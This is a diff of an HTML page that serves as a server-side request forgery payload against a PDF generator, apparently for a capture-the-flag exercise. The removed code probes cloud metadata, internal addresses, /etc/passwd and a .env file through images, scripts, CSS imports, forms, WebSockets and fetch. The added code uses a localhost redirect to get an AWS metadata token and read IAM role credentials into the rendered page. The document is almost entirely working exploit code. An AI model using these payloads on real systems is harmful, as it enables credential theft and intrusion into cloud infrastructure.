@@ -1,156 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Alternative PDF Exploitation</title>
+    <title>Exact Writeup Recreation</title>
 </head>
 <body>
-    <h1>🎯 Alternative PDF Generator Exploitation</h1>
-    <div id="results"></div>
+    <h1>📝 Exact Original Writeup Recreation</h1>
+    <div id="tokenResponse"></div>
+    <div id="metadataResponse"></div>
+    <div id="error"></div>
     
     <script>
-        var results = "";
-        results += "<h2>Method 1: Image Tag SSRF</h2>";
+        // Recreate the EXACT attack from the original writeup
+        var tokenUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
+        var metadataURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
+        var xhr = new XMLHttpRequest();
+        var token = '';
         
-        // Method 1: Use image tags to trigger requests (different from XMLHttpRequest)
-        var targets = [
-            'http://169.254.169.254/latest/meta-data/',
-            'http://127.0.0.1/',
-            'http://localhost/',
-            'http://10.0.0.1/',
-            'http://172.16.0.1/',
-            'http://192.168.1.1/',
-            'file:///etc/passwd',
-            'file:///proc/version',
-            'file:///var/www/html/.env'
-        ];
-        
-        for(var i = 0; i < targets.length; i++) {
-            var img = document.createElement('img');
-            img.style.width = '1px';
-            img.style.height = '1px';
-            img.onload = function() {
-                results += "<div style='background:#90ee90;padding:5px;'>✅ Image loaded from: " + this.src + "</div>";
-                document.getElementById("results").innerHTML = results;
-            };
-            img.onerror = function() {
-                results += "<div style='background:#ffcccb;padding:3px;'>❌ Image failed: " + this.src + "</div>";
-                document.getElementById("results").innerHTML = results;
-            };
-            img.src = targets[i];
-            document.body.appendChild(img);
+        try {
+            // Step 1: Get token using PUT request (exact method from writeup)
+            xhr.open('PUT', tokenUrl, false);
+            xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
+            xhr.send();
+            token = xhr.responseText;
+            document.getElementById("tokenResponse").innerHTML = "Token: " + token;
+
+            // Step 2: Use token to get S3Role credentials (exact method from writeup)
+            xhr.open('GET', metadataURL, false);
+            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
+            xhr.send();
+            document.getElementById("metadataResponse").innerHTML = xhr.responseText;
+            
+        } catch(err) {
+            document.getElementById('error').innerHTML = err.message;
         }
-        
-        results += "<h2>Method 2: Script Tag SSRF</h2>";
-        
-        // Method 2: Script tags (might bypass different restrictions)
-        setTimeout(function() {
-            var scriptTargets = [
-                'http://169.254.169.254/latest/user-data/',
-                'http://127.0.0.1/config.js',
-                'http://localhost/api.js',
-                'http://localhost/config.json'
-            ];
-            
-            for(var i = 0; i < scriptTargets.length; i++) {
-                var script = document.createElement('script');
-                script.onload = function() {
-                    results += "<div style='background:#90ee90;padding:5px;'>✅ Script loaded: " + this.src + "</div>";
-                    document.getElementById("results").innerHTML = results;
-                };
-                script.onerror = function() {
-                    results += "<div style='background:#ffcccb;padding:3px;'>❌ Script failed: " + this.src + "</div>";
-                    document.getElementById("results").innerHTML = results;
-                };
-                script.src = scriptTargets[i];
-                document.head.appendChild(script);
-            }
-        }, 2000);
-        
-        results += "<h2>Method 3: CSS Import SSRF</h2>";
-        
-        // Method 3: CSS imports (another vector)
-        setTimeout(function() {
-            var style = document.createElement('style');
-            style.textContent = `
-                @import url('http://169.254.169.254/latest/meta-data/');
-                @import url('http://127.0.0.1/styles.css');
-                @import url('file:///etc/passwd');
-            `;
-            document.head.appendChild(style);
-            results += "<div style='background:#e8f5e8;padding:5px;'>CSS imports attempted</div>";
-            document.getElementById("results").innerHTML = results;
-        }, 3000);
-        
-        results += "<h2>Method 4: Form Submission</h2>";
-        
-        // Method 4: Form submissions (might work differently)
-        setTimeout(function() {
-            var form = document.createElement('form');
-            form.method = 'GET';
-            form.action = 'http://169.254.169.254/latest/meta-data/';
-            form.target = '_blank';
-            form.style.display = 'none';
-            
-            var input = document.createElement('input');
-            input.name = 'test';
-            input.value = 'ssrf';
-            form.appendChild(input);
-            
-            document.body.appendChild(form);
-            results += "<div style='background:#e8f5e8;padding:5px;'>Form created for metadata service</div>";
-            document.getElementById("results").innerHTML = results;
-        }, 4000);
-        
-        results += "<h2>Method 5: WebSocket Attempt</h2>";
-        
-        // Method 5: WebSocket (if available)
-        setTimeout(function() {
-            try {
-                var ws = new WebSocket('ws://127.0.0.1:8080');
-                ws.onopen = function() {
-                    results += "<div style='background:#90ee90;padding:5px;'>✅ WebSocket opened to 127.0.0.1:8080</div>";
-                    document.getElementById("results").innerHTML = results;
-                };
-                ws.onerror = function() {
-                    results += "<div style='background:#ffcccb;padding:3px;'>❌ WebSocket failed</div>";
-                    document.getElementById("results").innerHTML = results;
-                };
-            } catch(e) {
-                results += "<div style='background:#ffcccb;padding:3px;'>❌ WebSocket not available</div>";
-                document.getElementById("results").innerHTML = results;
-            }
-        }, 5000);
-        
-        results += "<h2>Method 6: Fetch API (if available)</h2>";
-        
-        // Method 6: Fetch API with different options
-        setTimeout(function() {
-            if(typeof fetch !== 'undefined') {
-                var fetchTargets = [
-                    'http://169.254.169.254/latest/meta-data/',
-                    'http://127.0.0.1/',
-                    'file:///etc/passwd'
-                ];
-                
-                fetchTargets.forEach(function(url) {
-                    fetch(url, { mode: 'no-cors', credentials: 'omit' })
-                        .then(function() {
-                            results += "<div style='background:#90ee90;padding:5px;'>✅ Fetch succeeded: " + url + "</div>";
-                            document.getElementById("results").innerHTML = results;
-                        })
-                        .catch(function() {
-                            results += "<div style='background:#ffcccb;padding:3px;'>❌ Fetch failed: " + url + "</div>";
-                            document.getElementById("results").innerHTML = results;
-                        });
-                });
-            } else {
-                results += "<div style='background:#ffcccb;padding:3px;'>❌ Fetch API not available</div>";
-                document.getElementById("results").innerHTML = results;
-            }
-        }, 6000);
-        
-        // Initialize results
-        document.getElementById("results").innerHTML = results;
     </script>
 </body>
 </html>
